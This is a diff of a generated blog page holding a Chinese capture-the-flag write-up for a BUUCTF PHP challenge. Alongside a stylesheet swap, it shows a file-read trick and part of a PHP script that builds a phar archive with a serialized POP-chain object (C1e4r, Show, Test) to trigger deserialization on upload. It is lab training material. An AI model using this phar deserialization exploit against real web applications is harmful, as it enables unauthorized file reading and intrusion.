@@ -29,7 +29,15 @@
     
     
       
-      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.1.2/styles/atom-one-dark-reasonable.min.css" />
+      
+        
+          
+          
+          
+        
+        <link  rel="stylesheet" href="https://cdn.staticfile.org/prism/1.22.0/themes/prism-funky.min.css" />
+      
+      
     
   
 
@@ -248,7 +256,7 @@
               <h2 id="‘-’"><a href="#‘-’" class="headerlink" title="‘__’"></a>‘__’</h2><p><img src="https://ae03.alicdn.com/kf/Ub16431fd83624f07b158ba34f22c3a5c8.jpg" srcset="/img/loading.gif" alt="01.png">      </p>
 <p>一开始上传文件，试了一波，感觉不行<br>查看文件里也没有上传的文件，url变成了这<code>http://c8f4d1a6-6922-4386-b8ad-5454fdc52a38.node3.buuoj.cn/file.php?file=</code>感觉可以伪协议读取一波文件，网页注释中<code>flag is in f1ag.php</code>但没法直接读flag，但读不出来，看了WP，后面直接加文件名就行了，不用伪协议。。。。。。。。。。。。。。          </p>
 <p><code>index.php</code>       </p>
-<div class="hljs"><pre><code><pre><code class="hljs php">	<span class="hljs-meta">&lt;?php</span> 
+<pre><code><pre><code class="hljs php">	<span class="hljs-meta">&lt;?php</span> 
 	header(<span class="hljs-string">&quot;content-type:text/html;charset=utf-8&quot;</span>);  
 	<span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;base.php&#x27;</span>;
 	<span class="hljs-meta">?&gt;</span> 
@@ -363,10 +371,10 @@
 	        <span class="hljs-keyword">return</span> $text;
 	    &#125;
 	&#125;
-	<span class="hljs-meta">?&gt;</span></code></pre></div></code></pre>
+	<span class="hljs-meta">?&gt;</span></code></pre></code></pre>
 <p>主要就是这个class.php<br>没有<code>unserialize</code><br>应该是phar了<br>看一下，没过滤         </p>
 <p>pop链<br><code>C1e4r-&gt;__destruct-&gt;Show-&gt;__toString-&gt;Test-&gt;__get-&gt;get()</code>        </p>
-<div class="hljs"><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+<pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
 <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C1e4r</span></span>
 <span class="hljs-class"></span>&#123;
     <span class="hljs-keyword">public</span> $test;
@@ -408,7 +416,7 @@ $phar-&gt;setMetadata($c1e4r); <span class="hljs-comment">//触发的头是C1e4r
 $phar-&gt;addFromString(<span class="hljs-string">&quot;exp.txt&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>); <span class="hljs-comment">//随便写点什么生成个签名</span>
 $phar-&gt;stopBuffering();
 
-<span class="hljs-meta">?&gt;</span></code></pre></div></code></pre>
+<span class="hljs-meta">?&gt;</span></code></pre></code></pre>
 <p>生成的phar文件后缀改为<code>array(&quot;gif&quot;,&quot;jpeg&quot;,&quot;jpg&quot;,&quot;png&quot;)之中的</code><br>上传<br><code>/upload/</code>—–&gt;目录开着（还可以这样。。。）<br><img src="https://sc04.alicdn.com/kf/U7ef653ef22384f92b3c62d63c9147bf27.jpg" srcset="/img/loading.gif" alt="06.png"><br>复制文件名，访问即可得到flag<br><img src="https://ae03.alicdn.com/kf/U8f7e66d8be4549688e1d94f262ca86f6I.jpg" srcset="/img/loading.gif" alt="05.png">      </p>
 
             </div>
@@ -554,6 +562,8 @@ $phar-&gt;stopBuffering();
 
 
 
+  
+    
   
 
 
